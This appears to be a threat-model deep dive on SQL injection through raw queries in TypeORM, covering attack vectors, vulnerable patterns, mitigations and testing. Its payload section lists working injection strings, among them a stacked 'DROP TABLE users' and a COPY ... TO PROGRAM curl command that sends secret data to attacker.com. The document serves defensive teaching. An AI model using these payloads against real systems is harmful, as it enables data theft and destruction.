# Deep Analysis: SQL Injection via Raw Queries in TypeORM

## 1. Objective, Scope, and Methodology

### 1.1 Objective

The objective of this deep analysis is to thoroughly examine the threat of SQL Injection via raw queries in TypeORM, understand its potential impact, identify vulnerable code patterns, and provide concrete recommendations for prevention and mitigation.  We aim to provide developers with actionable guidance to eliminate this critical vulnerability.

### 1.2 Scope

This analysis focuses specifically on the use of raw SQL queries within TypeORM applications.  It covers:

*   Vulnerable TypeORM methods (`EntityManager.query()`, `Repository.query()`, `QueryBuilder.execute()` when used with raw SQL).
*   Common attack vectors and payloads.
*   Code examples demonstrating both vulnerable and secure implementations.
*   Detailed mitigation strategies, including code-level changes, database configuration, and external security measures.
*   Testing strategies to identify and confirm the absence of this vulnerability.

This analysis *does not* cover:

*   SQL injection vulnerabilities outside the context of TypeORM's raw query functionality (e.g., vulnerabilities in other parts of the application stack).
*   General database security best practices beyond the scope of this specific threat (though some overlap is inevitable).
*   Other types of injection attacks (e.g., NoSQL injection, command injection).

### 1.3 Methodology

This analysis will employ the following methodology:

1.  **Threat Modeling Review:**  Re-examine the provided threat model entry to ensure a clear understanding of the threat.
2.  **Code Analysis:**  Analyze TypeORM's source code and documentation to understand how raw queries are handled and identify potential vulnerabilities.
3.  **Vulnerability Research:**  Research known SQL injection techniques and payloads relevant to TypeORM and common database systems (e.g., PostgreSQL, MySQL, MariaDB, SQLite, MS SQL Server).
4.  **Proof-of-Concept Development:**  Create simplified, illustrative code examples demonstrating vulnerable and secure implementations.
5.  **Mitigation Strategy Development:**  Develop and document comprehensive mitigation strategies, including code-level recommendations, database configuration best practices, and external security measures.
6.  **Testing Strategy Definition:** Outline testing approaches to verify the effectiveness of mitigation strategies.

## 2. Deep Analysis of the Threat

### 2.1 Attack Vectors and Payloads

Attackers can exploit raw SQL queries in TypeORM by injecting malicious SQL code through any input that is directly incorporated into the query string.  Common attack vectors include:

*   **User Input Fields:**  Forms, search bars, URL parameters, API request bodies.
*   **Data Imported from External Sources:**  CSV files, third-party APIs, message queues.
*   **Database-Stored Data:**  If data previously stored in the database is itself vulnerable to SQL injection (a second-order injection), it can be used to trigger an injection when used in a raw query.

Here are some example payloads, assuming a vulnerable query like:

```typescript
const userId = req.params.id; // User-supplied input
const result = await entityManager.query(`SELECT * FROM users WHERE id = ${userId}`);
```

*   **Basic Data Extraction:**
    *   `Payload:` `' OR 1=1 --`
    *   `Resulting Query:` `SELECT * FROM users WHERE id = '' OR 1=1 --'`
    *   `Effect:`  Retrieves all users because `1=1` is always true. The `--` comments out the rest of the original query.

*   **Union-Based Injection (Data Extraction):**
    *   `Payload:` `' UNION SELECT username, password FROM users --`
    *   `Resulting Query:` `SELECT * FROM users WHERE id = '' UNION SELECT username, password FROM users --'`
    *   `Effect:`  Appends the results of a second query that selects usernames and passwords, potentially exposing sensitive data.

*   **Error-Based Injection (Information Gathering):**
    *   `Payload:` `' AND (SELECT 1/0) --`
    *   `Resulting Query:` `SELECT * FROM users WHERE id = '' AND (SELECT 1/0) --'`
    *   `Effect:`  Causes a division-by-zero error.  The error message might reveal information about the database structure or version.

*   **Time-Based Blind Injection (Information Gathering):**
    *   `Payload (PostgreSQL):` `' AND (SELECT pg_sleep(10)) --`
    *   `Payload (MySQL):` `' AND (SELECT SLEEP(10)) --`
    *   `Resulting Query:` `SELECT * FROM users WHERE id = '' AND (SELECT pg_sleep(10)) --'`
    *   `Effect:`  Causes a 10-second delay if the condition is true.  Attackers can use this to infer information bit by bit.

*   **Stacked Queries (Data Modification/Deletion/Command Execution):**
    *   `Payload:` `'; DROP TABLE users; --`
    *   `Resulting Query:` `SELECT * FROM users WHERE id = ''; DROP TABLE users; --'`
    *   `Effect:`  Executes a second query that deletes the `users` table.  This depends on the database configuration and user privileges.  Some databases (e.g., MS SQL Server) allow multiple statements by default; others (e.g., MySQL) may require specific connection settings.

*   **Out-of-Band Data Exfiltration (Advanced):**
    *   `Payload (PostgreSQL, requires specific extensions):` `'; COPY (SELECT secret_data FROM secrets) TO PROGRAM 'curl -X POST -d @- https://attacker.com/exfiltrate'; --`
    *   `Effect:`  Uses the `COPY ... TO PROGRAM` feature (if enabled) to send data to an attacker-controlled server.

### 2.2 Vulnerable Code Patterns

The primary vulnerable pattern is the direct concatenation of user-supplied input into a raw SQL query string.  This includes:

*   **String Interpolation:**
    ```typescript
    const result = await entityManager.query(`SELECT * FROM users WHERE id = ${userId}`);
    ```

*   **String Concatenation:**
    ```typescript
    const result = await entityManager.query("SELECT * FROM users WHERE id = " + userId);
    ```

*   **Template Literals (without proper escaping):**  While template literals are generally safer for other purposes, they are *not* safe for SQL queries unless the input is explicitly sanitized.

*   **Indirect Input:**  Even if the input doesn't come directly from the user, if it originates from an untrusted source (e.g., a database field that was previously populated with unsanitized data), it can still be vulnerable.

### 2.3 Mitigation Strategies (Detailed)

#### 2.3.1 Prefer TypeORM's Parameterized Query Mechanisms

This is the **most effective** mitigation.  TypeORM provides several ways to build queries that automatically use parameterized queries, preventing SQL injection:

*   **QueryBuilder:**
    ```typescript
    const result = await connection
        .createQueryBuilder()
        .select("user")
        .from(User, "user")
        .where("user.id = :id", { id: userId }) // Parameterized!
        .getMany();
    ```

*   **EntityManager/Repository Find Methods:**
    ```typescript
    const result = await userRepository.findOne({ where: { id: userId } }); // Parameterized!
    ```
    ```typescript
    const result = await entityManager.findOne(User, { where: { id: userId } }); // Parameterized!
    ```

These methods automatically handle escaping and parameterization, making SQL injection impossible (assuming TypeORM itself is not vulnerable).

#### 2.3.2 Strict Input Validation and Sanitization (If Raw Queries Are Unavoidable)

If, and *only if*, raw queries are absolutely necessary and cannot be replaced with TypeORM's built-in methods, rigorous input validation and sanitization are crucial.  This is a **defense-in-depth** measure, and should *never* be the sole protection.

*   **Input Validation:**
    *   **Whitelist Approach:**  Define a strict set of allowed characters or patterns for each input field.  Reject any input that doesn't conform.  For example, if `userId` is expected to be a number, validate that it contains only digits.
    *   **Type Checking:**  Ensure the input is of the expected data type (e.g., number, string, date).
    *   **Length Restrictions:**  Set reasonable minimum and maximum lengths for input fields.
    *   **Regular Expressions:** Use regular expressions to enforce specific input formats.  Be *very* careful with regular expressions, as overly complex or poorly written regexes can themselves be vulnerable to ReDoS (Regular Expression Denial of Service) attacks.

*   **Input Sanitization:**
    *   **Dedicated Sanitization Library:** Use a well-vetted, actively maintained sanitization library specifically designed for SQL.  Do *not* attempt to write your own sanitization routines, as this is extremely error-prone.  Examples include:
        *   **`sqlstring` (Node.js):**  A popular library for escaping SQL values.  However, it's crucial to use it correctly (see example below).
        *   **Database-Specific Libraries:** Some database drivers provide their own escaping functions.  Use these if available and recommended by the driver documentation.
    *   **Correct Usage of `sqlstring`:**
        ```typescript
        import * as sqlstring from 'sqlstring';

        const sanitizedUserId = sqlstring.escape(userId); // Escape the input
        const result = await entityManager.query(`SELECT * FROM users WHERE id = ${sanitizedUserId}`);
        ```
        **Important:**  `sqlstring.escape()` escapes the *value* for use within a query.  It does *not* escape identifiers (table or column names).  For identifiers, use `sqlstring.escapeId()`.  Never directly concatenate user input, even after escaping, if you can avoid it.

#### 2.3.3 Principle of Least Privilege (Database User)

The database user account used by TypeORM should have the absolute minimum necessary privileges.  This limits the potential damage an attacker can cause even if they successfully exploit a SQL injection vulnerability.

*   **Avoid Superuser/Owner Accounts:**  Never use the database owner or a superuser account for your application.
*   **Grant Specific Privileges:**  Grant only the necessary `SELECT`, `INSERT`, `UPDATE`, and `DELETE` privileges on the specific tables and columns the application needs to access.
*   **Revoke Unnecessary Privileges:**  Revoke privileges like `CREATE`, `DROP`, `ALTER`, `GRANT`, and `EXECUTE` unless absolutely required.
*   **Stored Procedures (with Caution):**  Consider using stored procedures with defined parameters to encapsulate database logic.  This can provide an additional layer of security, but stored procedures themselves can be vulnerable to SQL injection if not written carefully.

#### 2.3.4 Web Application Firewall (WAF)

A WAF can help detect and block SQL injection attempts before they reach your application.  This is a valuable layer of defense, but it should not be relied upon as the sole protection.

*   **Signature-Based Detection:**  WAFs use signatures to identify known SQL injection patterns.
*   **Anomaly Detection:**  Some WAFs can detect unusual query patterns that might indicate an attack.
*   **Regular Expression Filtering:**  WAFs can be configured to block requests containing suspicious characters or keywords.

### 2.4 Testing Strategies

Thorough testing is essential to ensure that your application is not vulnerable to SQL injection.

*   **Static Analysis:**  Use static analysis tools (e.g., linters, code analyzers) to identify potential vulnerabilities in your code.  Look for instances of raw query usage and ensure proper input validation and sanitization.
*   **Dynamic Analysis:**
    *   **Manual Penetration Testing:**  Manually attempt to inject SQL code into your application through all possible input vectors.  Use the payloads described in Section 2.1 as a starting point.
    *   **Automated Vulnerability Scanning:**  Use automated vulnerability scanners (e.g., OWASP ZAP, Burp Suite) to scan your application for SQL injection vulnerabilities.
    *   **Fuzz Testing:**  Use fuzz testing tools to generate a large number of random or semi-random inputs and test your application's response.  This can help uncover unexpected vulnerabilities.
*   **Unit Tests:**  Write unit tests to specifically test your data access layer, including any raw query logic.  These tests should include both valid and invalid inputs, and should verify that the correct data is returned and that no unexpected database operations occur.
*   **Integration Tests:**  Test the interaction between your application and the database, ensuring that data is handled correctly throughout the entire request lifecycle.
* **Database Query Monitoring:** Monitor database queries in real time (using database logs or monitoring tools) to detect any suspicious or unexpected queries. This can help identify SQL injection attempts that may have bypassed other security measures.

## 3. Conclusion

SQL Injection via raw queries in TypeORM is a critical vulnerability that can have severe consequences.  The best defense is to avoid raw queries entirely and use TypeORM's built-in parameterized query mechanisms.  If raw queries are unavoidable, strict input validation, sanitization using a dedicated library, and the principle of least privilege are essential.  Comprehensive testing, including static analysis, dynamic analysis, and unit/integration tests, is crucial to verify the effectiveness of mitigation strategies. By following these recommendations, developers can significantly reduce the risk of SQL injection and protect their applications and data.